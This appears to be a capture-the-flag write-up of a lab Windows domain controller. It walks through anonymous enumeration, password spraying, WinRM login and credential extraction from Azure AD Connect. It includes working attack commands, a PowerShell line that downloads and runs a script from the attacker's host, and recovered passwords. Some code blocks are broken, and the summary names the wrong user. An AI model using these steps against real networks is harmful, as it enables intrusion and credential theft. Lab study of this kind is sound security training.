```
The scan reveals many ports open, including port 53 (DNS), 389 (LDAP) and 445 (SMB). This reveals that the server is a domain controller. The domain is identified by Nmap as MEGABANK.LOCAL

WHAT NOW? we have a dc in front of us, but no valid creds for the domain! So this isnt an assumed breach scenario!

## LDAP enumeration

this is the first time i came accross this, and found this script: [https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py](https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py)

```bash
python windapsearch.py -u "" --dc-ip 10.10.10.172
```

![](MediaFiles/Pasted%20image%2020250624123958.png)

We can also enumerate the domain users.

```bash
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects
```

```bash

[+] No username provided. Will try anonymous bind.

the account `AAD_987d7f2f57d2`
```bash
cn: Guest
cn: AAD_987d7f2f57d2
```
indicates that `AD Connect` is installed in the domain. AD Connect is a tool that is used to synchronize an on-premise Active Directory environment to Azure Active Directory.

Using windapsearch we can further enumerate domain groups, and see which users belong to `Remote Management Users` . → This group allows its members to connect to computers using PowerShell Remoting.
```bash
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"
```

![](MediaFiles/Pasted%20image%2020250624124022.png)
The user mhope (CN=Mike Hope) is identified to be in the Remote Management Users group.

## RPC enumeration

We could also check rpc with `rpcclient` since `port 135` is open
```bash
rpcclient -U "" -N 10.10.10.172
```

```bash
querydispinfo
```

```bash
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.

```

## SMB enumeration

Let's use smbclient to test for SMB null sessions. Command output reports that the anonymous login attempt was successful, although it failed to list any shares.

We can attempt to get credentials and access it again
```bash
smbclient -N -L \\\\\\\\10.10.10.172\\\\
```
![](MediaFiles/Pasted%20image%2020250624124036.png)
### Domain Password policy

Let's use enum4linux to retrieve other domain information. We note that the Account Lockout Threshold is set to None , so we can attempt a password spray in order to obtain valid credentials. windapsearch can be used to create a list of domain users.
```bash
enum4linux -a 10.10.10.172
```
![](MediaFiles/Pasted%20image%2020250624124054.png)

### Find valid Users

According the the `password policy` , we found that `Account Lockout Threshold` is set to None , so we can attempt `password spraying` in order to obtain valid credentials without getting locked !!!

windapsearch can also be used to create a list of domain users.
```bash
windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut
-d '@' -f 1 | uniq > users.txt 
```
and we collected the valid users as shown below:
![](MediaFiles/Pasted%20image%2020250624124115.png)

---
# Foothold

## Password spraying

We have our user list, and for our password spraying attempt we can use a very short list of statistically likely passwords. It's worth appending the discovered usernames to this list, as having a password of the username is unfortunately a common practice., using this `wordlist`:
```bash
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-
usernames/master/weak-corporate-passwords/english-basic.txt
cat users.txt >> english-basic.txt
```

Next, we can use CrackMapExec to perform the password spray, noting that there is no risk in the accounts locking out owning to the absence of an account lockout policy.
```bash
crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt
```

```bash
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\mhope:Password1 STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\mhope:Welcome1 STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\mhope:Letmein1 STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\mhope:Password123 STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\mhope:Welcome123 STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\mhope:Letmein123 STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\mhope:mhope STATUS_LOGON_FAILURE
<SNIP>
SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\SABatchJobs:mhope STATUS_LOGON_FAILURE
SMB 10.10.10.172 445 MONTEVERDE [+] megabank\\SABatchJobs:SABatchJobs
```

This was successful and we have gained valid domain credentials: `SABatchJobs / SABatchJobs` .

## SMB enumeration as SABatchJobs

```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -x whoami
```
This wasn't successful.

We can instead use smbmap to enumerate the remote file shares, which lists our `permissions`.
```bash
smbmap -u SABatchJobs  -p SABatchJobs -d megabank -H 10.10.10.172
```
![](MediaFiles/Pasted%20image%2020250624124147.png)

Next, let's `crawl` the users$ share for potentially interesting files, such as Office documents, text and XML files. (saves time when having large number of shares)
```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A
'(xlsx|docx|txt|xml)' -R
```

This reveals the file azure.xml , which is automatically downloaded. this file contained a password!
```bash
<S N="Password">4n0therD4y@n0th3r$</S>
```

## Logging in as mhope

Let's check if `mhope` also uses this password in the local AD, as we know this account is in the `Remote Management Users` group.
```bash
evil-winrm -i 10.129.180.160 -u mhope -p '4n0therD4y@n0th3r$'
```
and we are in! , lets grab the flag: `c5493bf7722329e80c066b1b2f69a58f`

Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448
```
By inspecting those groups, the one that stands out is the group `MEGABANK\\Azure Admins`

the `group membership` could be found also by running:
```bash
net user mhope
```

## Bloodhound as mhope

Lets inspect the AD via bloodhound:
```shell
bloodhound-python -u 'mhope' -p '4n0therD4y@n0th3r$'  -d monteverde.htb -ns 10.129.180.160 -c All --zip
```

Very interesting, it appears that user `MHOPE` is member of `AZURE_ADMINS` group:
![](MediaFiles/Pasted%20image%2020250722192746.png)

## Inspecting the host's Program Files

since the user is member of `AZURE_ADMINS` group, lets try to find azure/microsoft related installed programs at `program files`
```bash
cd C:\\Progra~1
ls
```

```bash
Mode                LastWriteTime         Length Name

```
So what's going on here? how can we move forward?

## Abusing Azure AD connect

But before we proceed with exploiting it, how does `AD connnect` work?

I found this article: https://blog.xpnsec.com/azuread-connect-for-redteam/
which also aligns with some of the indicators i found above (like the installed programs for example).

In simple terms, this works due to the fact that `Azure AD connect` stores creds locally via sql, and if an attacker has local access (in our case is mhope), they can extract creds without the need to communicate with Azure.

In our case, `mhope` can connect to the local sql db and extract the configuration. Then we can decrypt the configuration and get the creds for the account that does the replication of Active Directory to Azure.

Well, the above appear to be related to `Azure-AD-Connect`and for this matter, i found this script: 
https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/blob/main/decrypt.ps1

- The script will attempt to: 
    - Connect to the ADSync SQL database.
    - Load the necessary cryptographic library (`mcrypt.dll`).
    - Retrieve and decrypt stored credentials (Domain, Username, and Password).

First start a web server on our host:
```shell
python -m http.server 8888
```

Transfer and run the powershell script:
```shell
iex(new-object net.webclient).downloadstring('http://10.10.14.202:8888/script.ps1')
```

Executing the powershell script on the host:
```shell
Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
Error connecting to SQL database. Trying next...
Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
Connection successful!
Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
great! it revealed plaintext password for the `administrator`

finally lets login
```bash
evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```
grabbed root flag `8c9b5fd59f2121d6181a4c2d5ff225d2`

# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

#### Reconnaissance
1. nmap `scan` -> target is a DC, chose **smb** , `rpc` and **ldap** services to focus on
2. **enumerate** `LDAP` -> found valid usernames, found one of those (AAD_sth) to indicate that `AD Connect` is installed on the host. Also from ldap enum i found that one user (mhope) is member of `Remote Management Users` group, meaning this user can login remotely. Later i `collected all the valid users`.
3. **enumerate** `RPC` -> nothing new found
4. **enumerate** `SMB` anonymously -> revealed the `domain password policy` via enum4linux

#### Foothold
5. `password spraying` was performed to find creds for our collected valid users, found valid domain creds for one user (SABatchJobs)
6. **enumerate** `SMB` as user SABatchJobs, found `plaintext password`
7. `correlated` the found password with user mhope as this user can remotely login with the `win-rm` service
8. **logged in** via evil-winrm to host using on user **svc-alfresco**, and grabbed the ==user flag==.
#### Privesc
1. Run **bloodhound**, and found that the compromised user (mhope) is member of `AZURE_ADMINS` group
2. **Inspected** the `Program Files` of the host to find `azure related installed programs`, found `AD Connect` related programs, as indicated by the ldap enum from one of the valid users (AAD_sth)
3. `Abused AD Connect` via a powershell script i found that `extracts credentials` from AD connect, which revealed the administrator's password as plaintext
4. using administrator's password we **login** via evil-winrm and grab the ==root flag==!

-----------
# Sidenotes

This was a machine i wont forget, mainly because this was my first time having to abuse AD Connect. Besides that part, no new attack vectors were introduced here.
